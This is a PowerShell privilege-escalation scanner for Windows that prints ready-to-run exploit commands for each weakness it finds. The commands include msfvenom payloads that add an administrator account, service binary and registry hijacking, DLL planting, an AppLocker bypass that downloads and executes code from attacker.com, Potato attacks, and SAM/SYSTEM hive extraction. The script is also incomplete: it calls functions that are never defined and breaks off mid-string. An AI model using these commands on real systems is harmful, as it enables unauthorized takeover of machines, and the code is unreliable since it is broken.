# Windows Privilege Escalation Hunter
# This script scans Windows systems for privilege escalation vectors and provides
# actionable commands to exploit them

<#
.SYNOPSIS
    Windows Privilege Escalation Hunter - Detects and provides exploitation guides for Windows privilege escalation vectors.
.DESCRIPTION
    This script performs comprehensive scans for common Windows privilege escalation vulnerabilities including
    service misconfigurations, unquoted service paths, token privileges, vulnerable software, weak permissions,
    and more. Results include specific commands to exploit identified vulnerabilities.
.NOTES
    Run with administrator privileges for best results, but the script will identify opportunities 
    for privilege escalation even without admin privileges.
#>

# ===============================================================
# Script setup
# ===============================================================

# Banner Function
function Show-Banner {
    Write-Host "`n`n" -NoNewline
    Write-Host "╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Blue
    Write-Host "║                                                               ║" -ForegroundColor Blue
    Write-Host "║             Windows Privilege Escalation Hunter               ║" -ForegroundColor Blue
    Write-Host "║                                                               ║" -ForegroundColor Blue
    Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Blue
    Write-Host "`n"

    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "Running as: $env:USERNAME"
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "Computer: $env:COMPUTERNAME"
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "Time: $(Get-Date)"
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption | Format-Table -HideTableHeaders | Out-String)".Trim()
    Write-Host "`n"
}

# Section Header Function
function Show-Section($title) {
    Write-Host "`n[+] " -ForegroundColor Blue -NoNewline
    Write-Host "$title" -ForegroundColor Cyan
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Blue
}

# Subsection Header Function
function Show-Subsection($title) {
    Write-Host "`n[>] " -ForegroundColor Yellow -NoNewline
    Write-Host "$title" -ForegroundColor White
    Write-Host "───────────────────────────────────────────────────────────────" -ForegroundColor Yellow
}

# Result Function for Privilege Escalation Vectors
function Show-PrivEscVector($title, $method, $command) {
    Write-Host "`n[!] " -ForegroundColor Red -NoNewline
    Write-Host "POTENTIAL PRIVILEGE ESCALATION VECTOR: " -ForegroundColor Red
    Write-Host "    $title" -ForegroundColor White
    Write-Host "    Method: " -ForegroundColor Yellow -NoNewline
    Write-Host "$method" -ForegroundColor White
    Write-Host "    Exploit Command: " -ForegroundColor Green -NoNewline
    Write-Host "$command" -ForegroundColor White
    
    # Add this result to our collection
    $global:PrivEscResults.Add(@{
        Title = $title
        Method = $method
        Command = $command
    })
}

# Initialize results collection
$global:PrivEscResults = New-Object System.Collections.ArrayList

# ===============================================================
# System Information
# ===============================================================

function Get-SystemInfo {
    Show-Section "System Information"
    
    # Basic System Info
    Write-Host "OS Details:" -ForegroundColor Yellow
    Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, ServicePackMajorVersion | Format-List

    # Get hostname and current user
    Write-Host "Hostname: $env:COMPUTERNAME" -ForegroundColor Yellow
    Write-Host "Current User: $env:USERNAME" -ForegroundColor Yellow
    
    # Check if current user is in the administrators group
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "Is Admin: $isAdmin" -ForegroundColor Yellow
    
    # Get the groups the current user is a member of
    Write-Host "`nUser Groups:" -ForegroundColor Yellow
    $groups = ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups | 
              ForEach-Object {
                  $_.Translate([Security.Principal.NTAccount]).Value
              }
    $groups | ForEach-Object { Write-Host "  $_" }
    
    # Check for high-privilege groups that might indicate privilege escalation opportunities
    $highPrivGroups = @(
        "Administrators", "Domain Admins", "Enterprise Admins", "Schema Admins", 
        "BUILTIN\Administrators", "DNSAdmins", "Server Operators", 
        "Print Operators", "Backup Operators", "Remote Desktop Users"
    )
    
    foreach ($group in $groups) {
        foreach ($privGroup in $highPrivGroups) {
            if ($group -like "*$privGroup*") {
                Show-PrivEscVector "High privilege group membership" "Group Privileges" "Use group '$group' privileges to access sensitive resources or perform privileged actions"
            }
        }
    }
    
    # Current User's Environment Variables
    Write-Host "`nEnvironment Variables:" -ForegroundColor Yellow
    Get-ChildItem Env: | Format-Table -AutoSize
    
    # Installed Hotfixes
    Show-Subsection "Installed Hotfixes"
    Get-HotFix | Select-Object HotFixID, InstalledOn | Format-Table -AutoSize
    
    # Check Windows version to identify if it's vulnerable to known exploits
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $buildNumber = [int]($os.BuildNumber)
    $osVersion = $os.Version
    
    if ($buildNumber -lt 17763) {  # Before Windows 10 1809
        Show-PrivEscVector "Older Windows Version: $($os.Caption) (Build $buildNumber)" "Known Vulnerabilities" "Check for known exploits such as PrintSpoofer, JuicyPotato, or RoguePotato"
    }
    
    # Check if AlwaysInstallElevated is enabled
    $hklm = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $hkcu = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $hklmValue = (Get-ItemProperty -Path $hklm -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcuValue = (Get-ItemProperty -Path $hkcu -ErrorAction SilentlyContinue).AlwaysInstallElevated
    
    if ($hklmValue -eq 1 -and $hkcuValue -eq 1) {
        Show-PrivEscVector "AlwaysInstallElevated Registry Keys Enabled" "MSI Installer Privilege Escalation" @"
# Create a malicious MSI package:
msfvenom -p windows/exec CMD='net user administrator P@ssw0rd /add' -f msi > exploit.msi

# Install the MSI package:
msiexec /quiet /qn /i exploit.msi
"@
    }
    
    # Check for weak permissions on Startup folders
    Show-Subsection "Checking for Startup folder permissions"
    
    $startupFolders = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    )
    
    foreach ($folder in $startupFolders) {
        if (Test-Path $folder) {
            try {
                $acl = Get-Acl $folder -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                $userHasWriteAccess = $false
                $everyoneHasWriteAccess = $false
                
                foreach ($accessRule in $acl.Access) {
                    $identity = $accessRule.IdentityReference.Value
                    
                    if (($identity -eq $currentUser -or $identity -like "*\$($env:USERNAME)") -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $userHasWriteAccess = $true
                    }
                    
                    if ($identity -eq "Everyone" -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $everyoneHasWriteAccess = $true
                    }
                }
                
                if ($userHasWriteAccess -or $everyoneHasWriteAccess) {
                    Write-Host "Writable Startup folder: $folder" -ForegroundColor Red
                    if ($userHasWriteAccess) { Write-Host "  Current user has write access!" -ForegroundColor Red }
                    if ($everyoneHasWriteAccess) { Write-Host "  Everyone has write access!" -ForegroundColor Red }
                    
                    $exploitCommand = @"
# Create a malicious shortcut:
# In PowerShell create a shortcut to cmd.exe that runs a malicious command
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$folder\malicious.lnk")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c net user evil P@ssw0rd /add && net localgroup administrators evil /add"
$Shortcut.Save()

# Or create a malicious executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > "$folder\malicious.exe"

# Wait for user logon
"@
                    Show-PrivEscVector "Writable Startup Folder: $folder" "Startup Item Abuse" $exploitCommand
                }
            } catch {
                # Skip ACL errors
            }
        }
    }
}

# ===============================================================
# Service Checks
# ===============================================================

function Check-Services {
    Show-Section "Service Checks"
    
    # Check for unquoted service paths
    Show-Subsection "Checking for Unquoted Service Paths"
    $unquotedServices = Get-WmiObject -Class Win32_Service | 
                        Where-Object { $_.PathName -notlike '"*"' -and $_.PathName -like '* *' } | 
                        Select-Object Name, PathName, StartMode, StartName
    
    if ($unquotedServices) {
        Write-Host "Found services with unquoted paths:" -ForegroundColor Red
        $unquotedServices | Format-Table -AutoSize
        
        foreach ($service in $unquotedServices) {
            $path = $service.PathName.Trim()
            # Extract the directory path up to the executable
            $splitPath = $path -split ".exe"
            if ($splitPath.Count -gt 0) {
                $execPath = $splitPath[0] + ".exe"
                $execPath = $execPath -replace "\s+$", ""
                
                # Check for spaces in the path
                $pathParts = $execPath -split " "
                if ($pathParts.Count -gt 1) {
                    $targetDir = [System.IO.Path]::GetDirectoryName($pathParts[0])
                    $fileName = [System.IO.Path]::GetFileName($pathParts[0])
                    
                    if ($targetDir -and (Test-Path $targetDir)) {
                        $exploitCommand = @"
# Create a malicious executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > $fileName.exe

# Copy to the vulnerable location:
copy $fileName.exe "$targetDir\$fileName.exe"

# Wait for service restart or system reboot
"@
                        Show-PrivEscVector "Unquoted Service Path: $($service.Name)" "Service Path Hijacking" $exploitCommand
                    }
                }
            }
        }
    } else {
        Write-Host "No unquoted service paths found." -ForegroundColor Green
    }
    
    # Check for services where the current user can modify the binary
    Show-Subsection "Checking for services with weak file permissions"
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -ne $null }
    
    foreach ($service in $services) {
        $path = $service.PathName
        # Clean up the path - remove quotes and arguments
        $path = $path -replace '^"([^"]+)".*$', '$1'
        $path = $path -split " " | Select-Object -First 1
        
        if (Test-Path $path) {
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                $userHasFullControl = $false
                $everyoneHasFullControl = $false
                $authenticatedUsersHasFullControl = $false
                
                foreach ($accessRule in $acl.Access) {
                    $identity = $accessRule.IdentityReference.Value
                    
                    if (($identity -eq $currentUser -or $identity -like "*\$($env:USERNAME)") -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $userHasFullControl = $true
                    }
                    
                    if ($identity -eq "Everyone" -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $everyoneHasFullControl = $true
                    }
                    
                    if ($identity -eq "NT AUTHORITY\Authenticated Users" -and 
                        $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
                        $authenticatedUsersHasFullControl = $true
                    }
                }
                
                if ($userHasFullControl -or $everyoneHasFullControl -or $authenticatedUsersHasFullControl) {
                    Write-Host "Service binary with weak permissions:" -ForegroundColor Red
                    Write-Host "  Service: $($service.Name)" -ForegroundColor White
                    Write-Host "  Path: $path" -ForegroundColor White
                    if ($userHasFullControl) { Write-Host "  Current user has write access!" -ForegroundColor Red }
                    if ($everyoneHasFullControl) { Write-Host "  Everyone has write access!" -ForegroundColor Red }
                    if ($authenticatedUsersHasFullControl) { Write-Host "  Authenticated Users have write access!" -ForegroundColor Red }
                    
                    $exploitCommand = @"
# Backup the original executable:
copy "$path" "$path.bak"

# Create a malicious executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > evil.exe

# Replace the service executable:
copy evil.exe "$path"

# Start the service (if you have permission) or wait for restart:
net start $($service.Name)
"@
                    Show-PrivEscVector "Weak Service Binary Permissions: $($service.Name)" "Service Binary Replacement" $exploitCommand
                }
            } catch {
                # Skip errors in getting ACLs
            }
        }
    }
    
    # Check for services with weak registry permissions
    Show-Subsection "Checking for services with weak registry permissions"
    $services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -ErrorAction SilentlyContinue
    
    foreach ($service in $services) {
        try {
            $acl = Get-Acl $service.PSPath -ErrorAction Stop
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $userHasFullControl = $false
            $everyoneHasFullControl = $false
            $authenticatedUsersHasFullControl = $false
            
            foreach ($accessRule in $acl.Access) {
                $identity = $accessRule.IdentityReference.Value
                
                if (($identity -eq $currentUser -or $identity -like "*\$($env:USERNAME)") -and 
                    $accessRule.RegistryRights -match "FullControl|SetValue|WriteKey") {
                    $userHasFullControl = $true
                }
                
                if ($identity -eq "Everyone" -and 
                    $accessRule.RegistryRights -match "FullControl|SetValue|WriteKey") {
                    $everyoneHasFullControl = $true
                }
                
                if ($identity -eq "NT AUTHORITY\Authenticated Users" -and 
                    $accessRule.RegistryRights -match "FullControl|SetValue|WriteKey") {
                    $authenticatedUsersHasFullControl = $true
                }
            }
            
            if ($userHasFullControl -or $everyoneHasFullControl -or $authenticatedUsersHasFullControl) {
                $serviceName = $service.PSChildName
                Write-Host "Service registry key with weak permissions:" -ForegroundColor Red
                Write-Host "  Service: $serviceName" -ForegroundColor White
                Write-Host "  Registry: $($service.PSPath)" -ForegroundColor White
                if ($userHasFullControl) { Write-Host "  Current user has write access!" -ForegroundColor Red }
                if ($everyoneHasFullControl) { Write-Host "  Everyone has write access!" -ForegroundColor Red }
                if ($authenticatedUsersHasFullControl) { Write-Host "  Authenticated Users have write access!" -ForegroundColor Red }
                
                $exploitCommand = @"
# Modify the service ImagePath registry value to point to a malicious executable:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\$serviceName" /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\malicious.exe" /f

# Create the malicious executable:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > C:\path\to\malicious.exe

# Restart the service or wait for system reboot
"@
                Show-PrivEscVector "Weak Service Registry Permissions: $serviceName" "Service Registry Modification" $exploitCommand
            }
        } catch {
            # Skip errors in getting ACLs
        }
    }
    
    # Check for modifiable service binaries in running auto-start services
    Show-Subsection "Checking for modifiable service binaries (Auto-Start)"
    $runningServices = Get-WmiObject -Class Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.State -eq "Running" }
    
    foreach ($service in $runningServices) {
        $binaryPath = $service.PathName -replace '^"([^"]+)".*$', '$1'
        $binaryPath = $binaryPath -split " " | Select-Object -First 1
        
        if (Test-Path $binaryPath) {
            # Check if we can replace the binary - test write permissions
            try {
                # This is a non-destructive test using the .NET API
                $fileInfo = New-Object System.IO.FileInfo($binaryPath)
                $canWrite = $false
                
                try {
                    # Try to open for write access, but don't actually write
                    $stream = $fileInfo.Open([System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
                    $canWrite = $true
                    $stream.Close()
                } catch {
                    # Can't write to the file
                }
                
                if ($canWrite) {
                    Write-Host "Service binary is writable:" -ForegroundColor Red
                    Write-Host "  Service: $($service.Name)" -ForegroundColor White
                    Write-Host "  Binary: $binaryPath" -ForegroundColor White
                    Write-Host "  State: $($service.State)" -ForegroundColor White
                    Write-Host "  Start Mode: $($service.StartMode)" -ForegroundColor White
                    
                    $exploitCommand = @"
# Backup the original binary:
copy "$binaryPath" "$binaryPath.bak"

# Create a malicious binary:
msfvenom -p windows/exec CMD='net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f exe > evil.exe

# Replace the binary:
copy evil.exe "$binaryPath"

# Restart the service or wait for system reboot
"@
                    Show-PrivEscVector "Writable Auto-Start Service Binary: $($service.Name)" "Service Binary Replacement" $exploitCommand
                }
            } catch {
                # Skip errors
            }
        }
    }
}

# ===============================================================
# DLL Hijacking Opportunities
# ===============================================================

function Check-DLLHijacking {
    Show-Section "DLL Hijacking Opportunities"
    
    # Check for potential DLL hijacking in PATH directories
    Show-Subsection "Checking for writable locations in PATH"
    
    $pathDirs = $env:PATH -split ";" | Where-Object { $_ -ne "" }
    
    $writableDirs = @()
    
    foreach ($dir in $pathDirs) {
        if (Test-Path $dir) {
            try {
                $tempFile = Join-Path $dir "write_test_$([Guid]::NewGuid().ToString()).tmp"
                [IO.File]::WriteAllText($tempFile, "test") | Out-Null
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                $writableDirs += $dir
                Write-Host "Writable PATH directory found: $dir" -ForegroundColor Red
            } catch {
                # Not writable, ignore
            }
        }
    }
    
    if ($writableDirs.Count -gt 0) {
        $exploitCommand = @"
# Create malicious DLLs in writable PATH locations:
# First, identify executables that might try to load DLLs from these paths
ProcessMonitor: Filter for "Result is NAME NOT FOUND" and "Path ends with .dll"

# Create one of the missing DLLs with msfvenom:
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > $($writableDirs[0])\missing.dll

# Alternatively, create common Windows DLLs that are frequently searched for:
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > $($writableDirs[0])\wlbsctrl.dll
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > $($writableDirs[0])\ualapi.dll
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > $($writableDirs[0])\wkscli.dll
"@
        Show-PrivEscVector "Writable directories in PATH" "DLL Hijacking" $exploitCommand
    }
    
    # Check for recently installed applications (potential for DLL hijacking)
    Show-Subsection "Checking for recently installed applications"
    
    $recent = Get-WmiObject -Class Win32_Product | 
                Select-Object Name, Version, InstallDate | 
                Sort-Object InstallDate -Descending | 
                Select-Object -First 10
    
    if ($recent) {
        Write-Host "Recently installed applications:" -ForegroundColor Yellow
        $recent | Format-Table -AutoSize
        
        $exploitCommand = @"
# Check for DLL hijacking opportunities in recently installed applications:
# Use Process Monitor to identify missing DLLs:
# 1. Start the application
# 2. Filter in Process Monitor: 
#    - Result is "NAME NOT FOUND"
#    - Path ends with ".dll"
#    - Process Name is the application's process

# For applications that use Side-by-Side assemblies, check:
dir C:\Windows\WinSxS /s /b | findstr manifest

# Create malicious DLLs for any identified missing libraries
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f dll > C:\path\to\missing.dll
"@
        Show-PrivEscVector "Recently installed applications may be vulnerable to DLL hijacking" "DLL Hijacking" $exploitCommand
    }
    
    # Check for potential WinSxS DLL hijacking opportunities
    Show-Subsection "Checking for WinSxS DLL hijacking opportunities"
    
    $winsxsPath = "C:\Windows\WinSxS"
    if (Test-Path $winsxsPath) {
        $manifestFiles = Get-ChildItem -Path $winsxsPath -Filter "*.manifest" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5
        
        if ($manifestFiles) {
            Write-Host "WinSxS manifest files found (showing sample):" -ForegroundColor Yellow
            $manifestFiles | Format-Table Name, FullName -AutoSize
            
            $exploitCommand = @"
# Analyze WinSxS manifests for DLL hijacking:
# 1. Find the application's manifest file
# 2. Look for DLL dependencies that might be loaded from an insecure location

# Example PowerShell to extract dependent DLLs from a manifest:
[xml]$manifest = Get-Content "C:\Windows\WinSxS\path\to\manifest.manifest"
$manifest.assembly.file | Where-Object { $_.name -like "*.dll" } | Select-Object name

# 3. Check if any of these DLLs can be planted in a location where they'll be loaded before the legitimate ones
"@
            Show-PrivEscVector "WinSxS assemblies may be vulnerable to DLL hijacking" "DLL Hijacking" $exploitCommand
        }
    }
}

# ===============================================================
# AlwaysInstallElevated & AppLocker Bypasses
# ===============================================================

function Check-InstallationPolicies {
    Show-Section "Installation Policies and Restrictions"
    
    # Check for AlwaysInstallElevated registry keys
    Show-Subsection "Checking for AlwaysInstallElevated registry keys"
    
    $hklm = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $hkcu = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $hklmValue = (Get-ItemProperty -Path $hklm -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcuValue = (Get-ItemProperty -Path $hkcu -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    
    if ($hklmValue -eq 1 -and $hkcuValue -eq 1) {
        Write-Host "AlwaysInstallElevated is enabled in both HKLM and HKCU!" -ForegroundColor Red
        
        $exploitCommand = @"
# Create a malicious MSI package:
msfvenom -p windows/exec CMD='cmd.exe /c net user evil P@ssw0rd /add && net localgroup administrators evil /add' -f msi > evil.msi

# Install the MSI package with elevated privileges:
msiexec /quiet /qn /i evil.msi
"@
        Show-PrivEscVector "AlwaysInstallElevated Enabled" "MSI Installation with Elevated Privileges" $exploitCommand
    } elseif ($hklmValue -eq 1 -or $hkcuValue -eq 1) {
        Write-Host "AlwaysInstallElevated is partially enabled (must be enabled in both HKLM and HKCU):" -ForegroundColor Yellow
        Write-Host "  HKLM value: $hklmValue" -ForegroundColor White
        Write-Host "  HKCU value: $hkcuValue" -ForegroundColor White
    } else {
        Write-Host "AlwaysInstallElevated is not enabled." -ForegroundColor Green
    }
    
    # Check for AppLocker policies
    Show-Subsection "Checking for AppLocker policies"
    
    $appLockerService = Get-Service -Name "AppIDSvc" -ErrorAction SilentlyContinue
    if ($appLockerService -and $appLockerService.Status -eq "Running") {
        Write-Host "AppLocker service is running." -ForegroundColor Yellow
        
        $rules = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
        if ($rules) {
            Write-Host "AppLocker rules are configured:" -ForegroundColor Yellow
            
            # Check Script Rules
            $scriptRules = $rules.RuleCollections | Where-Object { $_.RuleCollectionType -eq "Script" }
            if ($scriptRules) {
                Write-Host "  Script rules configured." -ForegroundColor White
                
                # Check if PowerShell is explicitly blocked
                $psBlocked = $false
                foreach ($rule in $scriptRules.Rules) {
                    if ($rule.Name -like "*PowerShell*" -and $rule.Action -eq "Deny") {
                        $psBlocked = $true
                        break
                    }
                }
                
                if ($psBlocked) {
                    Write-Host "  PowerShell appears to be blocked by AppLocker." -ForegroundColor Red
                } else {
                    $exploitCommand = @"
# AppLocker is active but may have bypasses. Try these techniques:
# 1. Use alternate execution paths:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# 2. Use signed binaries that can execute code:
# MSBuild XML inline task:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml

# JavaScript:
cscript //E:jscript payload.js

# InstallUtil:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# 3. Check if PowerShell downgrade is possible:
powershell -Version 2 -Command "Write-Host 'PowerShell v2 is available!'"
"@
                    Show-PrivEscVector "AppLocker Deployed - Potential Bypasses Available" "AppLocker Bypass" $exploitCommand
                }
            } else {
                Write-Host "  No script rules configured." -ForegroundColor Green
            }
            
            # Check Executable Rules
            $exeRules = $rules.RuleCollections | Where-Object { $_.RuleCollectionType -eq "Exe" }
            if ($exeRules) {
                Write-Host "  Executable rules configured." -ForegroundColor White
            } else {
                Write-Host "  No executable rules configured." -ForegroundColor Green
            }
        } else {
            Write-Host "AppLocker is enabled but no rules are configured." -ForegroundColor Green
        }
    } else {
        Write-Host "AppLocker service is not running." -ForegroundColor Green
    }
    
    # Check for PowerShell constrained language mode
    Show-Subsection "Checking for PowerShell constrained language mode"
    
    $langMode = $ExecutionContext.SessionState.LanguageMode
    Write-Host "PowerShell language mode: $langMode" -ForegroundColor Yellow
    
    if ($langMode -eq "ConstrainedLanguage") {
        $exploitCommand = @"
# PowerShell is in Constrained Language Mode. Try these bypasses:
# 1. Look for .NET methods that are still available:
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(address, type)

# 2. Use runspaces to create a new powershell instance:
$Runspace = [RunspaceFactory]::CreateRunspace()
$Runspace.Open()
$PowerShell = [PowerShell]::Create()
$PowerShell.Runspace = $Runspace
$PowerShell.AddScript(@'
# Your unrestricted script here
'@)
$PowerShell.Invoke()

# 3. Use alternate execution through COM objects:
$obj = New-Object -ComObject "WScript.Shell"
$obj.Run("cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\evil.exe")
"@
        Show-PrivEscVector "PowerShell Constrained Language Mode Enabled" "ConstrainedLanguage Bypass" $exploitCommand
    }
}

# ===============================================================
# Main Execution
# ===============================================================

function main {
    # Clear the screen
    Clear-Host
    
    # Show banner
    Show-Banner
    
    # Collect system information
    Get-SystemInfo
    
    # Check services
    Check-Services
    
    # Check token privileges
    Check-TokenPrivileges
    
    # Check for weak permissions
    Check-WeakPermissions
    
    # Search for credentials
    Find-Credentials
    
    # Check for vulnerable software
    Check-VulnerableSoftware
    
    # Check for DLL hijacking opportunities
    Check-DLLHijacking
    
    # Check installation policies and restrictions
    Check-InstallationPolicies
    
    # Show summary of privilege escalation vectors
    Show-Section "Privilege Escalation Vectors Summary"
    Write-Host "Found $($global:PrivEscResults.Count) potential privilege escalation vectors:" -ForegroundColor Yellow
    
    for ($i = 0; $i -lt $global:PrivEscResults.Count; $i++) {
        Write-Host "`n[$($i+1)] " -ForegroundColor Red -NoNewline
        Write-Host "$($global:PrivEscResults[$i].Title)" -ForegroundColor White
        Write-Host "    Method: " -ForegroundColor Yellow -NoNewline
        Write-Host "$($global:PrivEscResults[$i].Method)" -ForegroundColor White
        Write-Host "    Exploit Command:" -ForegroundColor Green
        Write-Host "    $($global:PrivEscResults[$i].Command)" -ForegroundColor White
    }
    
    Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Blue
    Write-Host "Windows Privilege Escalation Hunter completed!" -ForegroundColor Cyan
    Write-Host "Run with administrator privileges for more comprehensive results." -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Blue
}

# Execute main function
main

function Check-TokenPrivileges {
    Show-Section "Token Privileges"
    
    # We need to use C# code to access the Windows API for token privileges
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    public class TokenManipulator {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid {
            public int Count;
            public long Luid;
            public int Attr;
        }
        
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        
        public static bool EnablePrivilege(long processHandle, string privilege) {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr(processHandle);
            IntPtr htok = IntPtr.Zero;
            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            return retVal;
        }
    }
"@

    # List of interesting privileges to check
    $privileges = @(
        @{Name="SeImpersonatePrivilege"; Description="Impersonate a client after authentication"; ExploitMethod="Potato Attacks (JuicyPotato, PrintSpoofer, RoguePotato)"},
        @{Name="SeAssignPrimaryTokenPrivilege"; Description="Replace a process-level token"; ExploitMethod="Token Manipulation"},
        @{Name="SeBackupPrivilege"; Description="Back up files and directories"; ExploitMethod="Extract SAM/SYSTEM files"},
        @{Name="SeRestorePrivilege"; Description="Restore files and directories"; ExploitMethod="Overwrite system files"},
        @{Name="SeCreateTokenPrivilege"; Description="Create a token object"; ExploitMethod="Create arbitrary tokens"},
        @{Name="SeLoadDriverPrivilege"; Description="Load and unload device drivers"; ExploitMethod="Load vulnerable drivers"},
        @{Name="SeTakeOwnershipPrivilege"; Description="Take ownership of files or objects"; ExploitMethod="Take ownership of system files"},
        @{Name="SeDebugPrivilege"; Description="Debug programs"; ExploitMethod="Access other processes' memory"},
        @{Name="SeManageVolumePrivilege"; Description="Perform volume maintenance tasks"; ExploitMethod="Modify NTFS $MFT metadata"}
    )
    
    Write-Host "Checking for exploitable token privileges..." -ForegroundColor Yellow
    
    foreach ($privilege in $privileges) {
        try {
            $result = [TokenManipulator]::EnablePrivilege([System.Diagnostics.Process]::GetCurrentProcess().Id, $privilege.Name)
            if ($result) {
                Write-Host "  [ENABLED] $($privilege.Name): $($privilege.Description)" -ForegroundColor Green
                
                # Specific exploit advice based on privilege
                switch ($privilege.Name) {
                    "SeImpersonatePrivilege" {
                        Show-PrivEscVector "SeImpersonatePrivilege Enabled" "Potato Attack" @"
# For newer Windows 10/Server 2016+ versions (PrintSpoofer):
# Download PrintSpoofer from https://github.com/itm4n/PrintSpoofer
PrintSpoofer.exe -i -c "cmd.exe /c net user administrator P@ssw0rd /add && net localgroup administrators administrator /add"

# For older systems (JuicyPotato):
# Download JuicyPotato from https://github.com/ohpe/juicy-potato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user administrator P@ssw0rd /add && net localgroup administrators administrator /add" -t *
"@
                    }
                    "SeBackupPrivilege" {
                        Show-PrivEscVector "SeBackupPrivilege Enabled" "SAM/SYSTEM File Extraction" @"
# Create a backup of SAM and SYSTEM files:
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup
reg save HKLM\SECURITY security.backup

# Use Mimikatz or other tools to extract passwords from these files
# Copy these files to your attack machine and run:
secretsdump.py -sam sam.backup -system system.backup -security security.backup LOCAL
"@
                    }
                    "SeRestorePrivilege" {
                        Show-PrivEscVector "SeRestorePrivilege Enabled" "System File Replacement" @"
